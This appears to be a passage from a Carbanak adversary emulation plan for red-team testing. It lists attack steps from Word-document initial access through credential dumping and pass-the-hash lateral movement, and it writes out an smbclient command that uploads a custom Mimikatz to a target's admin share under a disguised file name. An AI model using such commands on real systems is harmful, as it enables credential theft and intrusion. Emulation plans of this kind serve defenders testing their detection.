...
This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found [here](/Enterprise/carbanak/Resources/placeholder_substitution).
...
* [Step 1 - Initial Access & Collection](#test-1-initial-access-with-embedded-vbe-in-word-document)
* [Step 2 - Registry Shellcode and Discovery](#test-2-registry-shellcode-and-execution)
* [Step 3 - Credential Dumping](#3a---uac-bypass-and-credential-dumping-t1549002-t1003001)
* [Step 4 - Lateral Movement](#4a---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550)
* [Step 5 - Credential Access](#test-5-credential-access)

### Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 2 Infrastructure](/Enterprise/carbanak/Emulation_Plan/Scenario_2/Infrastructure.md) documentation.
...
2. Upload Mimikatz (custom) to `hrmanager`
    ...
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put /home/<attacker>/Enterprise/carbanak/Resources/step4/attackkatz.exe Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\smrs.exe"
    ```
